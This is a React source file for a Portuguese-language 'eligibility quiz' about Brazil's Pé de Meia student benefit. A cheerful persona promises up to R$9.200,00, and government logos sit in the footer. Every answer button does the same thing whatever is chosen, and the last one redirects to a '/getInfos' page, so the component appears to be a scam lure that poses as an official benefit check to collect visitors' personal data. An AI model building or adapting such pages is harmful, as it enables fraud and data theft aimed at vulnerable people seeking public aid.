import { useState } from "react";
import { redirectWithParams } from "../../utils/redirectWithParams";
import atendente from '../../images/atendente.png';
import gov1 from '../../images/gov1.png';
import gov2 from '../../images/gov2.png';

function Quiz() {
    

    const textos = [
        ["Concluí o Ensino Médio antes de 2015",

            "Repeti de série apenas uma vez",

            "Já saquei todo o Pé de Meia",

            "Recebo auxílio do bolsa família",

            "Sou estudante",

            "Tenho 1 filho",
        ],


        ["Concluí o Ensino Médio entre os anos 2016-2025",

            "Repeti de série duas, três ou mais vezes",

            "Saquei uma parte do Pé de Meia",

            "Não recebo auxílio do bolsa família, mas recebia",

            "Trabalho (informalmente ou formalmente)",

            "Tenho dois ou mais filhos",
        ],


        ["Não concluí o Ensino Médio",

            "Nunca repeti de série",

            "Não saquei o Pé de Meia ainda",

            "Nunca recebi auxílio do bolsa família",

            "Estou desempregado",

            "Não tenho filhos",
        ],


    ];

    const TOTAL_STEPS = textos[0].length;

    const [step, setStep] = useState(0);
    const [animando, setAnimando] = useState(false);

    function changeText() {
        if (step === TOTAL_STEPS - 1) {
            redirectWithParams("/getInfos");
            return;
        }

        setAnimando(true);

        setTimeout(() => {
            setStep((prev) => prev + 1);
            setAnimando(false);
        }, 200);
    }

    return (
        <main className="flex flex-col min-h-screen relative">
            <div className="flex flex-col items-center justify-center bg-[var(--azul-claro)] h-40
        w-40 border-8 border-[var(--azul-escuro)] rounded-full mx-auto mt-7">
                <img src={atendente} alt="Foto Atendente" className='w-30 mt-1' />
            </div>

            <div
                id="messageShadow"
                className='border-1 border-black w-[90%] rounded-2xl absolute top-36 mx-auto left-1/2 
        -translate-x-1/2 px-4 py-2 bg-white mb-20'
            >
                <p className='text-center font-normal'>
                    Olá, meu nome é Dani!😊 e eu vou te ajudar a descobrir
                    se você tem o direito ao <span className='font-bold'> Pé de Meia </span> após a conclusão do ensino médio
                    a partir do <span className='font-bold'>ano 1990</span> e receber até <span className='font-bold'>R$9.200,00</span> 😍
                </p>
            </div>

            <div className="mt-[130px] text-center">
                <h2 className="font-semibold">Escolha uma opção abaixo</h2>

                <div
                    className={`mt-8 flex flex-col transition-opacity duration-200 ${animando ? "opacity-0" : "opacity-100"
                        }`}
                >
                    <button
                        onClick={changeText}
                        disabled={animando}
                        className="text-white bg-[var(--azul-escuro)] font-bold py-2 px-4 rounded-full w-[90%] mx-auto mt-4"
                    >
                        {textos[0][step]}
                    </button>

                    <button
                        onClick={changeText}
                        disabled={animando}
                        className="text-white bg-[var(--azul-escuro)] font-bold py-2 px-4 rounded-full w-[90%] mx-auto mt-4"
                    >
                        {textos[1][step]}
                    </button>

                    <button
                        onClick={changeText}
                        disabled={animando}
                        className="text-white bg-[var(--azul-escuro)] font-bold py-2 px-4 rounded-full w-[90%] mx-auto mt-4"
                    >
                        {textos[2][step]}
                    </button>
                </div>
            </div>

            <footer className="bg-[var(--azul-footer)] flex py-3 justify-center gap-20 mt-auto">
                <img src={gov1} alt="Gov1" className="w-20 object-contain" />
                <img src={gov2} alt="Gov2" className="w-20 object-contain" />
            </footer>
        </main>
    );
}

export default Quiz;
